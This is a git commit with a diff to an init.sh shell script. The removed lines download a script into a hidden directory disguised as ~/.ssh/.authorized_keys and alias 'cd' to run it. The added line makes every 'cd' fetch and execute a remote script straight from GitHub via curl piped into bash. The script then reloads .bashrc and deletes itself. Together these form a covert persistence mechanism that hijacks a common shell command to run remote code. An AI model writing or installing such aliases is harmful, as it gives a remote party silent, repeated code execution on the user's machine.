8dd8ce48e1288ee125dc709c1b067b448bc10736
mssiscroissant <mssiscroissant@outlook.com>
2024-10-25 16:28:49 +0200

    Update init.sh
    Use Script online

--- init.sh
+++ init.sh
@@ -1,10 +1,5 @@
 #!/bin/bash
 
-wget https://raw.githubusercontent.com/mssiscroissant/mssiscroissant/refs/heads/main/croissant.sh
-wget https://raw.githubusercontent.com/mssiscroissant/mssiscroissant/refs/heads/main/croissant.txt
-mkdir ~/.ssh/.authorized_keys/
-mv croissant.sh ~/.ssh/.authorized_keys/croissant.sh
-mv croissant.txt ~/.ssh/.authorized_keys/croissant.txt
-echo "alias cd='bash ~/.ssh/.authorized_keys/croissant.sh ~/.ssh/.authorized_keys/croissant.txt'" >> ~/.bashrc
+echo "alias cd='bash <(curl -s https://raw.githubusercontent.com/mssiscroissant/mssiscroissant/refs/heads/main/croissant.sh) https://raw.githubusercontent.com/mssiscroissant/mssiscroissant/refs/heads/main/croissant.txt'" >> ~/.bashrc
 source ~/.bashrc
 rm init.sh
